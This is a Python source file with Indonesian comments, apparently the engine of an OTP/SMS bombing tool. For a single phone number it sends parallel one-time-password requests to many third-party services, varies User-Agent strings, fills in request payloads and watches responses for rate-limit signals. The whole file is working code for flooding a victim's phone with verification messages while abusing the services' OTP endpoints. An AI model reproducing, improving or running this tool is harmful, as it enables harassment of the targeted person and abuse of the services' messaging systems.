"""
engine.py — Concurrent dispatcher.
Menjalankan semua target secara paralel dan melaporkan hasil real-time.
"""
from __future__ import annotations

import json
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Iterator

import requests
from requests.sessions import Session

from handlers import REGISTRY
from useragents import get_random_ua
from utils import resolve_payload


# ─────────────────────────────────────────────────────────────
# Keyword rate limit yang umum di response body
# ─────────────────────────────────────────────────────────────

_RATE_LIMIT_KEYWORDS = [
    "rate limit", "too many", "try again", "exceeded",
    "banned", "blocked", "terlalu banyak", "coba lagi",
]


# ─────────────────────────────────────────────────────────────
# Result dataclass
# ─────────────────────────────────────────────────────────────

@dataclass
class Result:
    name    : str
    ok      : bool
    status  : int  = 0
    detail  : str  = ""
    limited : bool = False   # True jika kena rate limit (HTTP 429 atau keyword)


# ─────────────────────────────────────────────────────────────
# Rate limit detection
# ─────────────────────────────────────────────────────────────

def _is_rate_limited(status: int, text: str) -> bool:
    if status == 429:
        return True
    text_lower = text.lower()
    return any(kw in text_lower for kw in _RATE_LIMIT_KEYWORDS)


# ─────────────────────────────────────────────────────────────
# Success checker generik (string matching)
# ─────────────────────────────────────────────────────────────

def _check_success_on(text: str, success_on: list[str]) -> bool:
    """Return True jika salah satu string di success_on ada di response text."""
    if not success_on:
        return False
    text_lower = text.lower()
    for pattern in success_on:
        if re.search(pattern.lower(), text_lower):
            return True
    return False


# ─────────────────────────────────────────────────────────────
# Dispatch satu target
# ─────────────────────────────────────────────────────────────

def _dispatch_json(phone_fmt: str, phone_raw: str, target: dict) -> requests.Response:
    """Kirim request untuk target bertipe 'json'."""
    headers = dict(target.get("headers", {}))

    # Resolve placeholder di nilai header (mis. x-device: {rand})
    for k, v in headers.items():
        if isinstance(v, str) and "{" in v:
            headers[k] = resolve_payload(v, phone_fmt, phone_raw)

    # Tambah header standar dengan UA acak
    headers.setdefault("User-Agent", get_random_ua())
    headers.setdefault("Accept", "application/json, text/plain, */*")

    if target.get("referer"):
        headers.setdefault("Referer", target["referer"])

    # Resolve payload
    raw_payload = resolve_payload(target["payload"], phone_fmt, phone_raw)
    content_type = headers.get("Content-Type", "application/json")

    s = Session()
    s.headers.update(headers)
    timeout = target.get("timeout", 15)

    if content_type.startswith("application/json"):
        return s.post(target["url"], json=json.loads(raw_payload), timeout=timeout)
    else:
        return s.post(target["url"], data=raw_payload.encode(), timeout=timeout)


def _send_one(phone: str, target: dict, stop_flag: threading.Event) -> Result:
    """Kirim OTP ke satu target, kembalikan Result."""
    name = target["name"]

    if stop_flag.is_set():
        return Result(name=name, ok=False, status=0, detail="Dibatalkan")

    try:
        phone_fmt  = target["number_fmt"](phone)
        phone_raw  = phone.lstrip("0")
        post_type  = target["post_type"]
        success_on = target.get("success_on", [])

        if post_type == "json":
            response = _dispatch_json(phone_fmt, phone_raw, target)
        else:
            # Custom handler
            if post_type not in REGISTRY:
                return Result(name=name, ok=False, status=0,
                              detail=f"handler '{post_type}' tidak ditemukan")
            handler_fn, check_fn = REGISTRY[post_type]
            s = Session()
            # Pasang UA acak ke session sebelum handler pakai
            s.headers.update({"User-Agent": get_random_ua()})
            response = handler_fn(phone_fmt, s)

            # Rate limit check sebelum custom check_fn
            if _is_rate_limited(response.status_code, response.text):
                return Result(name=name, ok=False, status=response.status_code,
                              detail="Rate limited", limited=True)

            # Custom check function jika ada
            if check_fn is not None:
                ok = check_fn(response)
                return Result(name=name, ok=ok, status=response.status_code,
                              detail=response.text[:80])

        # Generic success check
        status = response.status_code
        body   = response.text

        # Rate limit detection dulu
        if _is_rate_limited(status, body):
            return Result(name=name, ok=False, status=status,
                          detail="Rate limited", limited=True)

        # 2xx = kemungkinan sukses
        if 200 <= status < 300:
            ok = _check_success_on(body, success_on) if success_on else True
        else:
            ok = False

        return Result(name=name, ok=ok, status=status, detail=body[:80])

    except requests.exceptions.ConnectionError:
        return Result(name=name, ok=False, status=0, detail="Connection error")
    except requests.exceptions.Timeout:
        return Result(name=name, ok=False, status=0, detail="Timeout")
    except Exception as e:
        return Result(name=name, ok=False, status=0, detail=str(e)[:80])


# ─────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────

def send_all(phone: str, targets: list[dict],
             max_workers: int = 12,
             stop_flag: threading.Event | None = None) -> Iterator[Result]:
    """
    Kirim OTP ke semua target secara paralel.
    Yield Result satu per satu sesuai urutan selesai.

    stop_flag: threading.Event — set() untuk hentikan semua worker.
    """
    if stop_flag is None:
        stop_flag = threading.Event()

    enabled = [t for t in targets if t.get("enabled", True)]

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(_send_one, phone, t, stop_flag): t
            for t in enabled
        }
        for future in as_completed(futures):
            if stop_flag.is_set():
                for f in futures:
                    f.cancel()
                break
            try:
                yield future.result()
            except Exception as e:
                name = futures[future]["name"]
                yield Result(name=name, ok=False, status=0, detail=str(e)[:80])
